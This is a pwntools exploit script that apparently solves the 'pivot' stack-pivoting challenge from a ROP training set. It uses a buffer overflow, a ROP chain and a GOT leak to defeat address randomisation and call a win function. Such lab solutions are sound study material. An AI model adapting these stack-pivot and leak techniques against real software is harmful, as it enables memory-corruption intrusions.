from pwn import *
context.log_level = 'DEBUG'
r = process("./pivot")
elf = ELF("pivot")

pop_rax = p64(0x00000000004009bb)
pop_rdi = p64(0x0000000000400a33)
xchg_rax_rsp = p64(0x00000000004009bd)

foot_plt = elf.plt.foothold_function
foot_got = elf.got.foothold_function
puts_plt = elf.plt.puts
main = elf.symbols.main
foot_offset = 0x000000000000096a
win_offset = 0x0000000000000a81

r.recvuntil("pivot: ")
pivot_addr = int(r.recv(14).decode(), 16)

r.sendline(p64(foot_plt) + pop_rdi + p64(foot_got) + p64(puts_plt) + p64(main))
r.sendline(b"A"*40 + pop_rax + p64(pivot_addr) + xchg_rax_rsp)
r.recvuntil("libpivot\n")
foot_add = r.recv(6)
foot_addr = int.from_bytes(foot_add , "little")

libc_base = foot_addr - foot_offset
win = libc_base+win_offset

r.sendline(b"A"*40 + p64(win))
r.interactive()
